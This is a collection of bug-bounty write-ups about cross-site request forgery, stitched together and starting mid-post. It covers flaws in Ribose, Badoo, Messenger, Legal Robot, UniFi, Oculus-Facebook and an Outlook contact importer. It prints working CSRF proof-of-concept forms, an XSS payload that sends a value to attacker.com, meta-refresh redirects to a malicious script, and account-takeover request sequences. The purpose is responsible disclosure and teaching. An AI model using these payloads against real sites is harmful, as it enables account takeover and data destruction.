X-Requested-With: XMLHttpRequest Cookie: ... Connection: close As expected the request response was. 200ok But there was a problem to change the request using typical HTML PoC. I faced, in this case, the browser requires a page refresh to change the content of the requested page. I thought the request GET contains a bunch of HTTP header which may interrupt to changing the request. For sort out this problem, I used a little bit of javascript and the final HTML request look likes, <html> <head> <script type=\"text/javascript\"> var timer = null; function auto_reload() { window.location = 'https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&id48_hf_0=&gender=radio8&firstName=Account&lastName=Takeover&saveContact=1'; } </script> <body> <!-- Reload page every 5 seconds. --> <body onload=\"timer = setTimeout('auto_reload()',5000);\"> </body> </html> The victims need not to click on to Submit Request HTML form as like typical CSRF attacks. What it does, it will change the content of victims browser on just visiting the page. I also can set a time limit here to load the page and it will change the victim account info automatically.

The Add User feature caught my attention, generally speaking while checking out the application I always try to correlate application work flow with respect to different attack vector which I can execute , so that time straight away I though about CSRF.

ABSTRACT Introducing ourselves in the use of social media platform is a thing that couldn’t be separate for every user. Realized if the needs of this can’t be separate from social media life (to fulfill the needs profile introduction), Ribose’s developer has provided so many feature that could be used such as uploading the profile photo, adding the first and last name, adding the contact information, and many more. But the problem exists when one of that feature has a session problem that could allow the Attacker to illegally changes the information. In this case, Ribose doesn’t restrict yet the session to each authorized user to delete or upload the other photo profile. In other words, by using Attacker’s own session, they could delete or change all the profile photo that used by user at Ribose’s Platform. Please kindly note that the issue has been fixed and the article has been released with the permission of Ribose . II. INTRODUCTION 2.1. User ID at Ribose Different with other common platform that using number or even username as a unique identity, Ribose giving (the very complex user ID to be guessed) the long user ID that generated automatically when someone signing up their ID into Ribose’s Platform. For example, when we create an account with me@firstsight.me as email, we got 0b03d802–3e29–4564-xxxx-x1x1x1x1x1x1 as user ID. Generally, any user at this platform could see the other user ID since this parameter is not in the hidden situation. This conclusion could be seen in instant when we try to visit a user at Ribose. Press enter or click to view image in full size Figure 1: User ID of Team Ribose Account From the picture above, we could see if Team Ribose’s User ID is eeeeeeee-ffff-gggg-zzzz-z1z1z1z1z1z1 : 2.2. Deletion Action of Photo Profile When a user would like to delete their own photo, automatically the system will send the “DELETE” HTTP Method to the server with the user ID and CSRF-Token that used by the system to identify if the process is executed by authorized user. Here are the sample of the “DELETE” request to deleting the photo profile. DELETE /people/users/ 0b03d802-3e29-4564-xxxx-x1x1x1x1x1x1 /avatar?_rr=indigolocal_3BFA8A3E8&_rv=52dde6a5 HTTP/1.1 Host: www.ribose.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-CSRF-Token: <very long CSRF Token overhere> X-CSRF-Param: authenticity_token X-Requested-With: XMLHttpRequest Referer: https://www.ribose.com/ Content-Length: 1 Cookie: _r=<cookies_over_here> DNT: 1 Connection: close Table 1 Deletion Request of User’s Photo Profile As we could see, in theory, it’s not possible for Attacker to delete other user’s photo profile without the knowledge of victim’s CSRF-Token that (should) restrict to each session. But in this situation, it’s possible. By (only) changing the sent user ID (highlighted in red) into the Victim’ user ID, then the deletion process still executed by the system. 2.3. Photo Upload Action at Photo Profile By design at Ribose, this is not too different with the previous one. When a user would like to upload their own picture as their photo profile, automatically the system will send the “POST” HTTP Method to the server with the user ID, authenticity token, and CSRF-Token that used by the system to identify if the process is executed by authorized user. Here are the sample of the “POST” request to uploading the photo profile: Press enter or click to view image in full size Figure 2: Upload Request of User’s Photo Profile Just like our previous statement, as could be seen, in theory, it’s not possible for Attacker to upload the picture into the other user’s photo profile without the knowledge of victim’s CSRF-Token and authenticity token that (should) restrict to each session. But in this situation, it’s possible. By (only) changing the sent user ID (highlighted in red) into the Victim’ user ID, then the upload process still executed by the system. III. SUMMARY OF ISSUE As it has been described before, the security problem in this report is the Attacker could use their own session to delete or change all of the user’s photo that exist at the system. IV. PROOF OF CONCEPT 4.1. PoC of Unrestrited Deletion to Other Photo Profile The proof of concept related this one is not too hard since most of the root cause and process has been explained earlier. But for completing the explanation, we still write the step by step to reproducing the issue. 4.1.1. Find out the user ID of the victim that would like to be set as a target. If we found any difficulties to find those one, then we just need to approve the automatic “Team Ribose” friend invitation and visit Team Ribose’s profile to see the other user’s profile. Press enter or click to view image in full size Figure 3: Automatic Connection Request by Team Ribose Press enter or click to view image in full size Figure 4: Team Ribose’s Connections (Friend List) So basically, the Attacker just need to choose the list of the “victims” that could be seen at Team Ribose’s Profile. Of course, this method will reduce the Attacker’s time to guessing the very complex User ID that generated by Ribose. 4.1.2. The next step it, try to delete our own photo profile to get the “Deletion Request” that send by the application to server. In this case, we will get this as our deletion execution: Press enter or click to view image in full size Figure 5: Deletion Request of User’s Photo Profile When the request has been send into the server, then the server will give a “success” response. Here are the sample of valid request from our own session to delete our own photo profile: Press enter or click to view image in full size Figure 6: Valid Session to Delete our own Photo Profile 4.1.3. After we get this valid request, then all we need to delete victim’s photo profile is just replacing our own user ID to victim’s user ID. Here is the photo deletion sample to victim with Attacker’s session: Press enter or click to view image in full size Figure 7: Deleting the Photo with Attacker’s User ID As we could see from the picture above, the Attacker’s session has successfully to be used to delete the other photo profile. 4.2. PoC of Unrestrited Photo Changes to Other Photo Profile As we could see from the previous explanation, the proof of concept related this issue is not too different with the previous one. 4.2.1. Since we know already about the Ribose’s User ID design, then we will move forward to the method that used by Ribose to change the photo profile. 4.2.2. Try to upload our own photo profile to get the “Upload Request” that send by the application to server. In this case, we will get this as our deletion execution: Press enter or click to view image in full size Figure 8: Upload Request of User’s Photo Profile When the request has been send into the server, then the server will give a “success” response. Here are the sample of valid request from our own session to upload our own photo profile: Press enter or click to view image in full size Figure 9: Valid Session to Upload our own Photo Profile 4.2.3. After we get this valid request, then all we need to upload the picture into the victim’s photo profile is just replacing our own user ID to victim’s user ID. Here is the photo upload sample to victim with Attacker’s session. Press enter or click to view image in full size Figure 10: Uploading the Photo with Attacker’s User ID As we could see from the picture above, the Attacker’s session has successfully to be used to upload the picture into the other photo profile. V. RECOMMENDATION Ensuring that every session is only functioning for its own account (couldn’t be used by other users) would surely be a recommendation that can be implemented to cover the existed vulnerability. VI. RESPONSE Ribose has responded the issue very fast and also offer the compensation of reward into another (cool) one (since at that time, there is a little issue about the swag). They also fix the issue very fast (around one month) even the deploy need more time. VII. ADDITIONAL INFORMATION For completing the explanation, we upload the PoC Video that could be seen at Youtube: Unrestricted Deletion to other Photo Profile: https://youtu.be/dxv6Uj9_xsw Unrestricted Changes to other Photo Profile: https://youtu.be/ItlQg4lulnw VIII. LESSON LEARNED 8.1. Always try to changing our User ID into another User ID (as long the victim’s ID are easily predicted or could be found) even the targeted application has implement the CSRF Token that commonly used for restrict the session. In this case, Ribose has implement the unique User ID, CSRF Token (at header), and another custom header (CSRF Param) as a protection that looks hardcore to be bypassed. But, surprisingly, the design could be bypass by changing the User ID. 8.2. Generally, the things that we will do related the IDOR / CSRF bypass are: Just changing the parameter without thinking about the CSRF Token even the CSRF Token itself is exist at the application; Delete the CSRF Token (there is a possibility if the design could work without any CSRF Token even the application has implement it); Change the Victim’s CSRF Token to the Attacker’s CSRF Token (there is also a possibility if the action that conducted by victim could be processed by Attacker’s CSRF Token); And so many cool method that could be seen at: https://haiderm.com/10-methods-to-bypass-cross-site-request-forgery-csrf/ Csrf Bug Bounty Infosec Security Idor -- -- 2 Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free!

Basically lets consider Victim has an active session on a website and lets say victim has some details in his/her settings page on that website , so if no csrf token is implemented for the requests that go out from the settings page when someone tries to update the content in the settings page then an attacker can craft an html file or an image containing the details to be updated in the victim’s settings page using <form>, <input> etc in html , so as soon as the victim opens the image or the html file, the content in his/her settings page will get updated with the attackers’s content. The two conditions that must be satisfied for this attack to be carried out is that first , there shouldn’t be any token going with the requests from that site , secondly the Victim should have an active session on that site. So, one year back I was searching for bugs in this site m.badoo.com on hackerone platform , where i found this request https://m.badoo.com/api.phtml?SERVER_DELETE_ACCOUNT in burpsuite in which data was going in json format , as you can guess it was a request to delete the account of a registered user and similarly i got another one which was https://m.badoo.com/api.phtml?SERVER_RESET_TRUSTED_NETWORK , it was meant to delete all the contacts of a user on that site , so when i saw these requests i noticed that no csrf token was being sent alongwith these requests but the problem was that the data was sent in Json and i had to find a way to generate an HTML file for the CSRF POC , so I crafted two html files one for erasing imported contacts and another one for deleting account on m.badoo.com . But, as the content-type was json so parser introduced “=” at the end of content in header, so this became a problem for the attack to trigger but you can easily bypass such parameters by adding your own pair of values at the end like I added “ignore_me”:”’ value=’test”. The HTML code[Erasing Contacts] has been shown below : <html> <head> <meta name=\"DNT\" content=\"1\"> <meta name=\"Connection\" content=\"close\"> </head> <body> <form action=\" https://m.badoo.com/api.phtml?SERVER_RESET_TRUSTED_NETWORK \" method=\"POST\" enctype=\"text/plain\"> <input name='{\"$gpb\":\"badoo.bma.BadooMessage\",\"version\":1,\"message_type\":327,\"body\":[],\"is_background\":false, \"ignore_me\":\"' value='test\"}' type=\"hidden\"> <input type=\"submit\"> </body> </html> The other thing i would like to mention here is that the entire json payload passed in the name parameter will not be accepted as content-type Json until we mention enctype=”text/plain” in the form action. So it was somehow a little bit different from a basic HTML form we generate for CSRF. The moral of this finding is that if request is going in JSON format just use encoding-type as text/plain and also bypass the “=” that is automatically appended at the end of the content in the request.Below is the Response in the Browser after the victim opened up the html code in his/her browser . Press enter or click to view image in full size “Your contacts are being erased, this could take up to 5 minutes.” Finally i Received 280$ bounty from badoo through hackerone for this bug.

I hope you like it . :) . Please excuse my informal writing flow . So this is about how I chained one bug after the other to get stored XSS and CSRF . So lets jump into it : Lets call the site , site.com . On digging up the site one of the forms was susceptible to CSRF .So as usual i shot my request through engagement tools and generated a CSRF POC through Burp ! And guess what It worked like charm . I was happy (Sometimes it happens while hunting bugs , you start celebrating your success and later realize you did some stupid shit and ignored something ). Similar thing happened couple of months back when I though I found an IDOR , later realized I was hacking my own freaking account (Some User ID confusions) . Anyways Keeping it aside . So I realized that there was this stupid id parameter that was passed in the POST request that was unique that didn't let me do the CSRF . So let me rephrase my bug and call it ‘partial CSRF’. So there was a good news and a bad news : 1.There was no anti CSRF token in the POST body nor in the header . 2.There was a id (6 digits) that was sent along other parameters in the post request , that was acting kinda like a anti CSRF token . So there was no way i could do the CSRF attack (Shoot up comments if you have some ideas) . This was depressing ! After digging little further, I found one of the paramters in the POST request was vulnerable to XSS (Call me lucky , cause normally you wont find CSRF and XSS at the same place) . So I had two bugs in hand : 1. Patial CSRF : I was not able to do changes in the victims account since it gave error that id is not valid . 2. Reflected XSS : I could still toss up cookies to my server . So yeah it was a real bug . So now I had a real bug in hand . But I wanted to do CSRF because if it gets executed I can get a stored XSS . :) For doing the CSRF I had to get the value of ID somehow . For getting the value of the ID I had XSS in hand:) . But God had different plans for me . Unfortunately the form after doing a partial CSRF loads up the bogus id value that we forged . So it was not possible to get the ID value from that form (Shit ! It became tongue twister) . :( So I started building up the payload that would redirect me to the page that has the ID and fetch it for me . Unfortunately after several attempts I was not able to do so , Why ? Because when the new page loads up , the rest of the Javascript was not able to execute . (There may be definately some workarounds . Also correct me if I am wrong:) ) . I tried to using XHR , But still somehow the ID was not fetched . So I though and thought and thought . I did over thought and slept . Later again luck came into play . I analysed the page source of the forged form (Which was obtained after partial CSRF) for the ID at some other place . Fortunately , I found that Id hidden in one of the html element . Hey bhagwaan !!!! BC pehle kyon nhin dikha . So now the work was easy : The payload was pretty basic one : KadiNinda”><ScRipt>location.href = ‘ http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById( \"id\").value;</sCriPt> This would send a GET request containing the Id value for that user to my server . I Verified it using console network tab in the browser . 2. Once I had the id, Its pretty basic do a FULL CSRF and a Stored XSS . So Victory . That was all for the post . PS : This is my page , Ultimate1337trolls . Where I do lots of leet trolls . Would appreciate if you join the leet gang ! :D Security Bug Bounty Appsec Cybersecurity -- -- 3 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

This is whereby an attacker can abuse the fact that cookies are implicity sent with a request (regardless of where the request is made from), and perform actions on another users behalf, such as sending a message or updating a status. There are different ways of mitigating this (with varying results), but usually this is achieved by sending a non-guessable token with each request, and comparing it to a value stored server-side/decrypting it and verifying the contents. The way I normally check for these is as follows: Perform the request without modifying the parameters, so we can see what the expected result is Remove the CSRF token completely (in this case, the fb_dtsg parameter) Modify one of the characters in the token (but keep the length the same) Remove the value of the token (but leave the parameter in place) Convert to a GET request If any of the above steps produce the same result as #1 then we know that the end-point is likely to be vulnerable (there are some instances where you might get a successful response, but in fact no data has been modified and therefore the token hasn’t been checked). Normally, on Faceboook, the response is one of two, depending on if the request is an AJAX request or not (indicated by the __a parameter). Either a redirect to /common/invalid_request.php : Or an error message: I submitted the following request to change the sound_enabled setting, without fb_dtsg : POST /settings/edit/ HTTP/1.1 Host: www.messenger.com Content-Type: application/x-www-form-urlencoded settings[sound_enabled]=false&__a=1 Which surprisingly gave me the following response: HTTP/1.1 200 OK Content-Type: application/x-javascript; charset=utf-8 Content-Length: 3559 for (;;);{\"__ar\":1,\"payload\":[],\"jsmods\":{\"instances\":[[\"m_a_0\",[\"MarketingLogger\"],[null,{\"is_mobile\":false,\"controller_name\":\"XMessengerDotComSettingsEditController\" ...

So i started reading some public disclosures from https://hackerone.com/hacktivity . after reading some good blogs i have decided to implement them. so i quickly i had selected my target. So i had noticed that legalrobot ( Legal Robot )has a quick response and it is resolving the vulnerabilities quicky. so i have selected Legal Robot as my target and started looking into the assets and its scope. after understanding the scope i had started looking into the application.and i had noticed that is not sanitizing the spacial characters from some parameters. so i started injecting some html tags and was able to inject html tags. Press enter or click to view image in full size So yeah i had found HTML injection. BUG #1. So i started finding xss over there that if i am able to execute xss or not. so it had injected the payload but i had found that web application is using CSP. and alert was not popping up. :(((((((( sad part. :( Press enter or click to view image in full size but if you are a hacker then you will never get satisfied until and unless you will exploit it so i had started digging more and i put my second use case payload. which was “/><META HTTP-EQUIV=”refresh” CONTENT=”1;url=https://app.legalrobot.com/sign-out\"> So yes i with the help of this payload whenever the user visits the roadmap page it will automatically get log out from his-her account. and i had found this tricky. so next i had tried to redirect on my website. and executive malicious script. so i used this payload “/><META HTTP-EQUIV=”refresh” CONTENT=”1;url=http://www.mysite.com/malicious_script.html\"> and what it was resulting to open redirectBUG #2 and also executing my malicious scripts. Press enter or click to view image in full size some how i was able to perform malicious tasks. Quickly i made a PoC of it and reported. and i got quick reply from team, which was this. Press enter or click to view image in full size though the bug was triaged but the team member has mentioned that attacker has to do a little social engineering. i was like yeah but was not satisfied when i read “SOCIAL ENGINEERING” but the team member had gave me a hint by mentioning “UNKNOWN EXPLOIT”. well i that was enough hint for me. again i started digging into the application. and while i was digging into the web application had noticed that the web application is using the websockets. okay now i started checking headers of every pages and i found a Origin header. which was misconfigured. #BUG 3 so i started connecting to third party web sockets to this application and i was able to connect to the application by using the third party web sockets. Press enter or click to view image in full size it was allows web socket connecting from different Origin & it should not work from different origin. i think mobile app hasn’t origin. (I am still not sure about this) so some how i was able to do CSRF attack BUG #4 by using this & i had chained HTML INJECTION WHICH WAS RESULTING TO OPEN REDIRECT to CSRF ATTACK. again i quickly made a poc of this and reported it. This was a quick reply & bug has patched in a single day. (SO QUICK) Press enter or click to view image in full size got a good feedback with a sweet bounty amout. Thanks HackerOne Legal Robot . Thanks for reading guys. Comments most welcome. have a great day ahead.

Menu Home Advisories Privacy Policy Bug Bounty Invites! SecProject Yet Other Examples of Abusing CSRF in Logout The “ Login/logout CSRF: Time to reconsider? ” blog post by Mathias Karlsson ( @avlidienbrunn ) is a great resource that shows why sometimes CSRF in logout/login can be considered as an impactful security issue and how it can be abused. In Mathias’ blog post, unauthenticated XSS can also be exploited similar to the self-XSS issue but it is less complicated. This is when a XSS is not accessible to authenticated users. In that case, the attacker logs the user out to deliver the XSS payload which waits for the user to authenticate in another tab in order to perform the ultimate attack. Recently, I found another similar but rare example to perform CSRF attacks in a “secure” website that required logging victims out and waiting for them to log back in later. Although this case is not as common as the examples described by Matthias, it is still a valid case to consider during an assessment. The websites I was testing had an anti-CSRF token in every POST requests that changed per-session, per-request, and per-page. However, as the logout page used a GET request it was vulnerable to CSRF attacks. The web application kept the anti-CSRF token value in the user’s session on the server-side, and GET and POST requests were not interchangeable. All was good until I realised that some of the previously captured POST requests can be replayed with a new authenticated session cookie if I remove the anti-CSRF token’s parameter from the body of the POST request. I could however only send one token-less POST request to each page as I received a security error afterwards. This showed that the website was creating an anti-CSRF token for a page upon accessing the page for the first time (there was also a page that could generate an anti-CSRF token for a given page using AJAX but that is not important here). As a result, I could not exploit this issue if the victim had already browsed a page that I wanted to target. However, as the logout page was vulnerable to CSRF attacks, I could exploit this issue by tricking the victim to visit a malicious website that would: Send a malicious POST request to the website without an anti-CSRF token’s parameter just in case I was very lucky and the victim had not browsed that particular page (very unlikely as it had a few pages) Log the victim out of the target website Keep sending the malicious POST request without the anti-CSRF token’s parameter to perform an action in the background until the user logs back in the target website in another browser tab This entry was posted in Security Posts and tagged CSRF , XSRF , XSS on April 23, 2019 by Soroush Dalili .

You can read the documentation here . The usual flow is: Application requests graph.facebook.com/oauth/device?type=device_code&client_id=1 to retreive a hash code and user_code The application tells the user to go to facebook.com/device and input the user_code The user inputs the code and verifies the application through usual OAuth flow. user_code is then connected to application code. https://www.facebook.com/v2.5/dialog/oauth?redirect_uri=https%3A%2F%2Fm.facebook.com%2Fdevice.php%3FuserCode%3D{ $user_code }&client_id=1234 This is the mobile version of device login flow - redirect_uri points to a mobile domain. The application can now request graph.facebook.com/oauth/device?type=device_token&client_id=1&code=hash_code to gain the user access_token The problem lies in step number 3: when user_code is connected to application_code, it is done like so: https://m.facebook.com/device.php?userCode= $userCode &code= $appCode As you can see, there is no CSRF protection, so I started building my proof of concept around that: The attacker requests graph.facebook.com/oauth/device?type=device_code&client_id=1 to get the user_code ( abcd ) and hash code ( 4567 ) Present a page to victim which will load https://www.facebook.com/v2.5/dialog/oauth?redirect_uri=https%3A%2F%2Fm.facebook.com%2Fdevice.php%3FuserCode%3D abcd &client_id=1234 The /dialog/oauth will redirect to https://m.facebook.com/device.php?userCode= abcd &code=aZx... which will succeed The attacker now requests graph.facebook.com/oauth/device?type=device_token&client_id=1&code= 4567 to get the access_token of the victim. To exploit this, attacker would need to know the victim has approved an application which has “Login for Devices” enabled, which makes it fairly hard to abuse - this is a perfect storm vulnerability. Through further testing, I found out that every app which has “Login from Devices” enabled, and “Web OAuth Login” disabled gets “m.facebook.com/device.php” automagically added as a valid redirect_uri. Theoretically, if a pre-approved official Facebook application is made for the future iToaster, this bug could have lead to info disclosure on any Facebook account, and perhaps more, depending on the app permissions. It was a long shot, and I found no such application (thanks @phwd for help here). Facebook has fixed this first by adding a re-confirmation prompt every time you try to use device login, and later by implementing CSRF protection through \"state\" OAuth parameter: The timeline: December 8, 2015: Bug reported December 9, 2015: Additional information sent, along with a proof of concept page December 11, 2015: Facebook confirms the vulnerability February 1, 2016: I ask for updates about the report February 10, 2016: Facebook informs me they have fixed the issue February 10, 2016: Nope, message was sent in error February 18, 2016: Bug is now fixed Random blog post Bug bounties Race conditions on the web written on July 12th, 2016 Read more Josip Franjković web security consultant I enjoy breaking websites and participating in various bug bounty programs.

This article will give you some insights about my discovered generic Cross-Site Request Forgery Protection Bypass in Ubiquiti’s UniFi v3.2.10 and below, as published some time earlier this year on HackerOne . This vulnerability basically allows an attacker to compromise the UniFi installation including connected devices by e.g. changing passwords of users, adding new users, changing device usernames and passwords or by creating new WLAN configurations. At the end of this article you can also read about the reason for the disclosure delay and about my experience with the Ubiquiti Bug Bounty program – but first let’s start with the more interesting stuff 😉 Technical Details about the Vulnerability It’s basically about a faulty Cross-Site Request Forgery protection. Ubiquiti’s CSRF protection basically verifies whether the Referer header exists and whether the header value matches the host where the UniFi application is running on. So if an attacker tries to exploit a functionality within UniFi with a Referer header, which is not the same like the host of the UniFi installation, the application denies the action: HTTP/1.1 401 Unauthorized Server: Apache-Coyote/1.1 Content-Type: application/json;charset=ISO-8859-1 Content-Length: 78 Date: Thu, 19 Mar 2015 17:24:53 GMT { \"data\" : [ ] , \"meta\" : { \"msg\" : \"api.err.LoginRequired\" , \"rc\" : \"error\"}} But if the Referer header is stripped, the application happily accepts any action. Thus all an attacker has to do is to strip out the Referer header. This could be achieved using the following script: <html> <head> <script> function load() { var postdata = '<form id=csrf method=POST enctype=\\'text\\/plain\\' action=\\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\'>' + '<input type=hidden name=\\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\' value=\\'\\' />' + '</form>'; top.frames[0].document.body.innerHTML=postdata; top.frames[0].document.getElementById('csrf').submit(); } </script> </head> <body onload=\"load()\"> <iframe src=\"about:blank\" id=\"noreferer\">< /iframe> </body> </html> This script is about multiple tricks to achieve the JSON-based CSRF: 1. enctype=’text/plain’ Without using the enctype set to text/plain, the payload is sent using the “application/x-www-form-urlencoded” Content-Type, which results in a malformed request like: json%3D%257B%2522name%2522%253A%2522admin%2522%252C%2522x_password%2522%253A%2522csrfpwd%2522%252C%2522email%2522%253A%2522info%2540rcesecurity.com%2522%252C%2522lang%2522%253A%2522en_US%2522%252C%2522cmd%2522%253A%2522set-self%2522%257D= Setting the Content-Type to text/plain using enctype solves this problem: json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= 2. Using the payload in the <input name> attribute If you use the payload in the value attribute, then you have to use the name attribute too (otherwise the payload isn’t sent at all), which results in a malformed request like the following: payload=json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D Using the payload in the name tag, solves this problem, since the value tag is optional: json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= 3. iframe src=”about:blank” To strip out the Referer header, a nice and simple trick as outlined by webstersprodigy can be utilized: By setting the iframe source to “about:blank” the Referer header can be stripped, because “about:blank” obviously doesn’t have a domain. 4. top.frames[0].document.body.innerHTML=postdata; In combination with the iframe source trick, Javascript’s top.frames can be used to fill the iframe with contents to submit. Et voila. Working exploit 🙂 json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D= (The trailing “=” can be ignored, as the application does 🙂 ) Why this delay of the official disclosure? The reason for the delay of this blog article and the posting on Full-Disclosure, is a simple one: While doing the coordination process on HackerOne, I requested a CVE from MITRE, but due to some internal changes on their side, it took them more than one month and several pings to issue a statement about that. Unfortunately, I then received the answer that MITRE will not assign CVEs to vulnerabilities in uncommon applications like the Ubiquiti one: The MITRE CVE team has started enforcing the scope and coverage requirements previously agreed upon with the CVE Editorial Board, and outlined in http://cve.mitre.org/cve/data_sources_product_coverage.html . MITRE and the CVE Editorial Board agreed upon this scope several years ago, but only recently put it into effect by declining to assign CVE IDs to products that are out of scope. We are currently working with the CVE Editorial Board to define a more up to date list of products, as well as a process that would allow products to be added or subtracted as appropriate, but do not know when this will be completed. This is quite interesting, because for the past 5 years MITRE assigned CVEs for all my vulnerabilities without problems, but stopped to do so in general now. In my opinion this leads the CVE system ad aburdum, because vulnerabilities (regardless of their severity) in uncommon software won’t be tracked anymore. So…Maybe OSVDB-IDs should replace CVEs 😉 Well, at least at the point of finalizing this article, MITRE has added Ubiquiti to the list of proposed products. Final thoughts about the bug bounty program Maybe you have heard of the really nice RCE vulnerability , which was awarded with $18k by Ubiquiti. However as this is by itself a very fitting reward, I still like to outline that my generic (!) CSRF protection bypass was only rewarded with $500, although it’s possible to compromise UniFi and all connected devices – changing device passwords seems not to be so bad – right? I think this is a heavily unbalanced rewarding scheme as applied by Ubiquiti. Plus their communication behavior during the coordination process is more than poor. Nothing more to say.

Here’s the full content:\n\nHacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Hacking Facebook accounts using CSRF in Oculus-Facebook integration written on January 15th, 2018 Oculus enables users to connect their Facebook accounts for a more \"social\" experience. This can be done using both the native Windows Oculus application and using browsers. I took a deeper look at the native Windows flow, and found a CSRF vulnerability which allowed me to connect a victim's Facebook account to attacker's Oculus account. Once connected, the attacker could extract the victim's access token, and use Facebook's GraphQL queries to take over the account. Steps to take over the victim's Facebook account: Using the attacker's Oculus account, create the following GraphQL mutation. The mutation should be sent to graph.oculus.com/graphql , with the attacker's Oculus access_token : Mutation Test { facebook_sso_uri_generate( <input> ) { uri } } &query_params={\"input\":{\"client_mutation_id\":\"1\"}} The response will contain a link similar to this: https://www.oculus.com/facebook_login_sso/?username=josip.tester1&ext=1508804050&hash=AeQ6a90lgYfffT5k The idea behind the link is to enable a single click integration between the two services. If the victim clicks on the link or visits a page which renders it as the src attribute on an <img> tag, their Facebook account will be connected to the attacker's Oculus account. In the background, the link actually redirects to Facebook's OAuth flow, skips it, and then connects the two accounts. At this point I thought about reporting this to Facebook, since the attacker could view victim's partial friend list and other minor information, but decided to dig a bit deeper into the native application. The app's app.asar contained references to a GraphQL query which returned information about the connected Facebook account: viewer(){ linked_accounts_info { facebook_account { facebook_id } } } Getting the Facebook ID is useless - it is public anyway. However... After a bit of guessing, I found out it is also possible to query for the victim's Facebook access_token: viewer(){ linked_accounts_info { facebook_account { access_token } } } A screenshot of the request and the response: This is a first-party access_token , which also has access to Facebook's GraphQL endpoint - third party apps are not allowed to do that. Once you get such a token, you have full control of the account. By previously decompiling various Facebook apps, I had recorded some persisted GraphQL queries. I used these to prove the account takeover and add a new phone number to my test victim's account: doc_id is the persisted query ID, matching the \"SendConfirmationMutation\" mutation which adds a new mobile phone. graph.facebook.com/graphql? doc_id=10153582085883380 &variables={\"input\":{\"client_mutation_id\":1,\"actor_id\":\"FBID\", \"phone_number\":\" +PHONENUMBER \"}} &access_token= VICTIMTOKEN After the confirmation code arrives, we can confirm it using \"ConfirmPhoneCodeMutation\": graph.facebook.com/graphql? doc_id=10153582085808380 &variables= {\"input\":{\"client_mutation_id\":1,\"actor_id\":\"FBID\", \"confirmation_code\":\" CODE \"}}& method=post&access_token= VICTIMTOKEN Finally, reset the victim's password using the attacker's confirmed mobile phone. Timeline: 24th of October, 2017, 03:20 - Report sent to Facebook 24th of October, 2017, 10:50 - First reply from Facebook 24th of October, 2017, 11:30 - Temporary fix for the bug (disabled /facebook_login_sso/ endpoint) 30th of October, 2017 - Bug is now fixed. The fix was to check if the currently logged-in user on Oculus matches the username parameter from the SSO link, which means a login CSRF or response splitting or any other way to set victim's cookies would defeat it. A couple weeks later I found a login CSRF which could also be used to redirect the victim to an Oculus URL I chose - the perfect candidate to bypass the first fix. Steps to reproduce are the same as in the first bug, with an additional one between steps 2 and 3: After getting the /facebook_login_sso/ $LINK , the following request could be made using cURL to auth.oculus.com/nonce-redirect/ curl -v --cookie \"oc_ac_at=..snip..\" --referer \"https://auth.oculus.com/\" -d \"require_token_for=752908224809889&redirect_uri=https://www.oculus.com/account_receivable/?redirect_uri= $LINK \" https://auth.oculus.com/nonce-redirect/ The response contained an /account_receivable/ link with a nonce, which logs the victim into the attacker's Oculus account, and then redirects to the SSO link, skips the OAuth flow, and connects the account. Timeline: 18th of November, 2017, 02:40 - Report sent to Facebook 18th of November, 2017, 05:10 - First reply from Facebook 18th of November, 2017, 10:00 - Temporary fix for the bug (disabled /facebook_login_sso/ endpoint once again) 11th of December, 2017 - Bug is now fixed. This time, the fix was to implement a CSRF check on the /account_receivable/ endpoint, AND add an additional click to confirm the link between Facebook and Oculus accounts. I believe this properly fixes the vulnerability without degrading user experience too much. As always, a big thank you to Facebook for running their bug bounty program. Shout-out to Pete Yaworski for proofreading this blog, and to @phwd for his awesome GraphQL / API write-ups.

This bug has some similarities to Dan Melamed's findings (archive.org link). To exploit this, you need a Facebook account, an Outlook.com (Hotmail) email, and a victim. The Outlook email must not be bound to your Facebook account. When you approve Facebook to access Outlook's contact book, a GET request to https://m.facebook.com/contact-importer/login/?api_instance=1&api_ver=wave5&auth_token=TOKEN is made, which adds the email to your account. This request has no checks; you can repeat it as many times as you want. The problem is, it works for OTHER users too. So, the course of action to take over victim's account would be: Use \"Find contacts on Facebook\" from attacker account and log all requests Find the /contact-importer/login request Remove added email from your (attacker) account Get the victim to somehow make the /contact-importer/login request (infinite possibilities here) Email is now added to victim's account, silently Use \"Forgot your password\" to take over the account Click here for a video demonstrating the vulnerability.

